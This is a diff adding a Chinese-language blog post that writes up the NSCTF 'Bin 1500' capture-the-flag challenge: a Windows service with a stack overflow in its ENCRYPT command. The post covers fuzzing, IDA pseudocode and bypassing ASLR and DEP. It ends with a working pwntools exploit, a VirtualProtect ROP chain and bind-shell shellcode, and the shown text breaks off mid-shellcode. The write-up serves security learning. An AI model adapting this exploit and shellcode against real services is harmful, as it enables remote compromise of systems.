@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="robots" content="index,follow" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <meta name="author" content="Chu" />
+        <meta name="description" content="Chu 的博客" />
+        <meta name="keywords" content="Chu,网络安全,编程开发" />
+
+        <title>NSCTF Bin 1500 - Chu&#39;s BLoG</title>
+
+        
+		
+		
+        <link rel="stylesheet" href="/css/main.5d65992f9b793fc8ef4d51468c16f848fbe23ebfca8a5cd9508abf8cc4389cc7.css" integrity="sha256-XWWZL5t5P8jvTVFGjBb4SPviPr/KilzZUIq/jMQ4nMc=" />
+        <link rel="alternate" href="/index.xml" type="application/atom+xml" title="RSS" />
+    </head>
+
+    <body>
+        <header></header>
+        <main>
+<article>
+    <header>
+        <h1>NSCTF Bin 1500</h1>
+        <div>
+            <time datetime="2015-09-28 11:48:51 +0800 CST">发布时间: 2015-09-28 11:48</time>
+            <time datetime="2015-09-28 11:48:51 +0800 CST">更新时间: 2015-09-28 11:48</time>
+        </div>
+    </header>
+
+    <section>
+    <p>实战中体验了次 DEP &amp; ASLR 的绕过。</p>
+<h2 id="fuzz-溢出点">Fuzz 溢出点</h2>
+<p>题目里只给了个 PE 程序，运行程序后 <code>netstat -anbp tcp</code> 可以看到程序正在监听 2994 端口。PEiD 查看发现是 AsPack 的壳，ESP 定律 脱壳后丢到 IDA 中搜索欢迎信息（<code>shift F12</code>），F5 得到如下伪代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">sub_401120</span>(SOCKET s)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  	<span style="color:#960050;background-color:#1e0010">···</span> SNIP <span style="color:#960050;background-color:#1e0010">···</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">sub_4016BE</span>(<span style="color:#f92672">&amp;</span>buf, <span style="color:#e6db74">&#34;ENCRYPT &#34;</span>, <span style="color:#ae81ff">8</span>) )
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        v12 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>)<span style="color:#f92672">&amp;</span>v10;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sub_4010C0</span>(s, (<span style="color:#66d9ef">int</span>)<span style="color:#f92672">&amp;</span>v10);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">sub_4016BE</span>(<span style="color:#f92672">&amp;</span>buf, <span style="color:#e6db74">&#34;STATUS&#34;</span>, <span style="color:#ae81ff">7</span>) )
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        v4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetModuleHandleA</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sub_405EB0</span>(<span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1452</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sub_40177E</span>(<span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">1452</span>, <span style="color:#e6db74">&#34;OK: Current Module Load @ 0x%.8X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, v4);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">send</span>(s, <span style="color:#f92672">&amp;</span>buf, <span style="color:#a6e22e">strlen</span>(<span style="color:#f92672">&amp;</span>buf), <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">sub_4016BE</span>(<span style="color:#f92672">&amp;</span>buf, <span style="color:#e6db74">&#34;EXIT&#34;</span>, <span style="color:#ae81ff">4</span>) )
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sub_405EB0</span>(<span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1452</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sub_40179C</span>(<span style="color:#e6db74">&#34;Session Exit:SOCKET[%d]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, s);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sub_40177E</span>(<span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">1452</span>, <span style="color:#e6db74">&#34;Session Exit:SOCKET[%d]&#34;</span>, s);
+</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> <span style="color:#a6e22e">send</span>(s, <span style="color:#f92672">&amp;</span>buf, <span style="color:#a6e22e">strlen</span>(<span style="color:#f92672">&amp;</span>buf), <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( s <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">closesocket</span>(s);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">···</span> SNIP <span style="color:#960050;background-color:#1e0010">···</span>
+</span></span></code></pre></div><p>可以发现只有三个操作，简单 Fuzz 下就会发现 ENCRYPT 函数会导致程序崩溃：</p>
+<p><img src="nsctf-bin-1500-1.png" alt=""></p>
+<p>接下来需要做的就是具体的分析 ENCRYPT 函数。</p>
+<h2 id="分析溢出函数">分析溢出函数</h2>
+<p>跟进 10C0 可以看到函数取了输入的前两位并将剩余的一起放入 1030 中：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">sub_4010C0</span>(SOCKET s, <span style="color:#66d9ef">int</span> a2)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span> v2; <span style="color:#75715e">// cx@1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">4</span>]; <span style="color:#75715e">// [sp+10h] [bp-204h]@1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v5; <span style="color:#75715e">// [sp+14h] [bp-200h]@1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  v2 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_WORD <span style="color:#f92672">*</span>)a2;                            <span style="color:#75715e">// a2 =&gt; ABCEEFG
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                                <span style="color:#75715e">// v2 =&gt; AB
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)buf <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_WORD <span style="color:#f92672">*</span>)a2;                <span style="color:#75715e">// buf =&gt; ecx =&gt; ABCDEFGH前两字节 =&gt; AB
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">sub_401030</span>(v2, (<span style="color:#66d9ef">int</span>)<span style="color:#f92672">&amp;</span>v5, a2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>);             <span style="color:#75715e">// a2+2 =&gt; CDEFGH
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">send</span>(s, buf, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">send</span>(s, <span style="color:#f92672">&amp;</span>v5, <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span> <span style="color:#f92672">*</span>)buf, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>继续跟进，终于看到真正的操作了。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> __usercall sub_401030<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#f92672">&lt;</span>eax<span style="color:#f92672">&gt;</span>(<span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> a1<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#f92672">&lt;</span>ebx<span style="color:#f92672">&gt;</span>, <span style="color:#66d9ef">int</span> a2, <span style="color:#66d9ef">int</span> a3)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// eax@2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> v4; <span style="color:#75715e">// esi@2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v5; <span style="color:#75715e">// edi@3
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> result; <span style="color:#75715e">// eax@5
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v7; <span style="color:#75715e">// edx@7
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v8; <span style="color:#75715e">// ecx@8
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v9; <span style="color:#75715e">// edi@9
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>byte_40F95C )                           <span style="color:#75715e">// 异或表
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  {
+</span></span><span style="display:flex;"><span>    v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">sub_401566</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sub_4015B7</span>(v3);
+</span></span><span style="display:flex;"><span>    v4 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span>)dword_40F968;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      v5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">sub_4015C9</span>() <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">16</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)v4 <span style="color:#f92672">=</span> v5 <span style="color:#f92672">+</span> <span style="color:#a6e22e">sub_4015C9</span>();
+</span></span><span style="display:flex;"><span>      v4 <span style="color:#f92672">+=</span> <span style="color:#ae81ff">4</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( v4 <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span>)<span style="color:#f92672">&amp;</span>dword_40F9E8 );
+</span></span><span style="display:flex;"><span>    byte_40F95C <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;                            <span style="color:#75715e">// 只生成1次异或表
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  }
+</span></span><span style="display:flex;"><span>  result <span style="color:#f92672">=</span> a1 <span style="color:#f92672">/</span> <span style="color:#ae81ff">4</span>;                              <span style="color:#75715e">// 控制异或次数
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> ( a1 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">3</span> )
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">++</span>result;
+</span></span><span style="display:flex;"><span>  v7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( result <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    v8 <span style="color:#f92672">=</span> a2;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      v9 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(a3 <span style="color:#f92672">-</span> a2 <span style="color:#f92672">+</span> v8) <span style="color:#f92672">^</span> dword_40F968[v7<span style="color:#f92672">++</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x1F</span>];<span style="color:#75715e">// v7 =&gt; edx、edi(edx计数、edi保存)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                                <span style="color:#75715e">// 取key and后保存在edi中
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                                <span style="color:#75715e">// 与输入异或保存在edi中
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)v8 <span style="color:#f92672">=</span> v9;                       <span style="color:#75715e">// memcpy！造成溢出。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      v8 <span style="color:#f92672">+=</span> <span style="color:#ae81ff">4</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( v7 <span style="color:#f92672">&lt;</span> result );
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>可以看出前两个字符用于控制需要加密的数据大小，接下来的则是需要加密的数据。这里存在两个问题：</p>
+<ul>
+<li>异或表只生成了一次，可以通过第一次异或的结果推导出 Key，进而可以控制第二次生成的密文。</li>
+<li>未对输入长度进行判断，导致了栈溢出。</li>
+</ul>
+<p>手工二分法大致判断出溢出长度为 500 到 1000 之间，通过 <code>mona.py</code> 生成的字符串可以定位覆盖 EIP 的具体长度。</p>
+<h2 id="对抗-dep--aslr">对抗 DEP &amp; ASLR</h2>
+<p>就此题而言，对抗 ASLR 很简单，因为 <code>STATUS</code> 命令会直接返回模块加载的基地址。通过 ROP 绕过 DEP，在 IDA 里可以看到官方给写好很多小配件（helper 段）：</p>
+<p><img src="nsctf-bin-1500-2.png" alt=""></p>
+<p>结合这些小配件就可以编写出自己的 ROP 链，最终的 EXP 如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#coding: utf-8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>conn <span style="color:#f92672">=</span> remote(HOST, <span style="color:#ae81ff">2994</span>)
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>newline <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># get welcome message</span>
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># get addr</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;try to get the base addr&#34;</span>)
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;STATUS&#34;</span>)
+</span></span><span style="display:flex;"><span>base <span style="color:#f92672">=</span> int(conn<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>strip()[<span style="color:#f92672">-</span><span style="color:#ae81ff">10</span>:], <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;base addr =&gt; </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hex(base)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># first encryption, to get the table</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;send the first packet, try to get the table&#34;</span>)
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;ENCRYPT </span><span style="color:#ae81ff">\x80\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x80</span>)
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>table <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># second encryption, exploit it</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;send the second packet, try to exploit it&#34;</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x200</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># save esp to eax, ebx</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pack(base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1001</span>)              <span style="color:#75715e"># mov eax, esp; retn</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pack(base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1004</span>)              <span style="color:#75715e"># mov ebx, eax; retn</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># point ebx to shellcode</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pack(base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1015</span>)              <span style="color:#75715e"># add ebx, 20; retn</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pack(base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1015</span>)              <span style="color:#75715e"># add ebx, 20; retn</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pack(base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1015</span>)              <span style="color:#75715e"># add ebx, 20; retn</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pack(base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1015</span>)              <span style="color:#75715e"># add ebx, 20; retn</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pack(base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1015</span>)              <span style="color:#75715e"># add ebx, 20; retn</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># point eax to parameter1</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pack(base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x100e</span>)              <span style="color:#75715e"># add eax, 10; retn</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pack(base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x100e</span>)              <span style="color:#75715e"># add eax, 10; retn</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pack(base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x100e</span>)              <span style="color:#75715e"># add eax, 10; retn</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pack(base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x100e</span>)              <span style="color:#75715e"># add eax, 10; retn</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pack(base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x100e</span>)              <span style="color:#75715e"># add eax, 10; retn</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pack(base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x3814</span>)              <span style="color:#75715e"># pop ecx; retn</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pack(<span style="color:#ae81ff">0x4</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pack(base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x5c0a</span>)              <span style="color:#75715e"># sub eax, ecx; retn</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># modify parameter 1</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pack(base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1007</span>)              <span style="color:#75715e"># mov dword ptr ds:[eax],ebx; retn</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># point eax to ret addr &amp; modify ret</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pack(base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x100a</span>)              <span style="color:#75715e"># sub eax, 4; retn</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pack(base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1007</span>)              <span style="color:#75715e"># mov dword ptr ds:[eax],ebx; retn</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># call VirtualProtect</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pack(base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x101b</span>)              <span style="color:#75715e"># push kernel32.VirtualProtect; retn</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;AAAA&#34;</span>                         <span style="color:#75715e"># ret</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;BBBB&#34;</span>                         <span style="color:#75715e"># lpAddress</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pack(<span style="color:#ae81ff">0x200</span>)                    <span style="color:#75715e"># dwsize</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pack(<span style="color:#ae81ff">0x40</span>)                     <span style="color:#75715e"># flNewProtect</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pack(<span style="color:#ae81ff">0x00010000</span>)               <span style="color:#75715e"># lpflOldProtect</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x10</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># shellcode for bind shell</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff\xd5\x6a\x08\x59\x50\xe2\xfd\x40\x50\x40\x50\x68</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x11\x5c\x89</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x57</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x68\xb7\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff\xd5\x57\x97\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63</span><span style="color:#e6db74">&#34;</span>
